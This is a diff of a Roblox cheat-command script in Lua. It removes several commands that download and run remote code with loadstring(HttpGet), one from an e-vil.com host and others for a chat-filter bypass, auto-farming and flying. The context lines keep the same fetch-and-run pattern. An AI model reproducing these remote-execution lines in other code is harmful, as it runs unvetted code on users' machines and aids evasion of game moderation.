@@ -8438,26 +8438,6 @@ cmd.add({"zukahub","zhub"},{"zukahub (zhub)","The Main GUI"},function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxtech1/luaprojects2/refs/heads/main/ZukasFunBox.lua"))()
 end)
 
-cmd.add({"CreatorGUI"}, {"exploitcreator", "Unique Maker"}, function()
-	 loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
- end)
-
-cmd.add({"rageai","aichat"}, {"zukabot", "Ragebait Ai Bot"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/theogcheater2020-pixel/luaprojects2/refs/heads/main/chat.lua"))()
- end)
-
-cmd.add({"chatfucker","catchat"}, {"catbypass", "Bypass Chat"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix"))()
- end
-
-cmd.add({"zombieauto"}, {"zattackui", "Auto Farmer Zombie Attack"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZZINS077/Zombie-Attack/refs/heads/main/ZZINS%20HUB"))()
- end)
-
-cmd.add({"flyv2"}, {"flyv2ui", "Better fly script"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/FlyR15.lua"))()
- end)
-
 cmd.add({"lastcommand","lastcmd"},{"lastcommand (lastcmd)","Re-run your previously executed command"},function()
 	local last=NAStuff._lastCommand
 	local first = last and last[1]
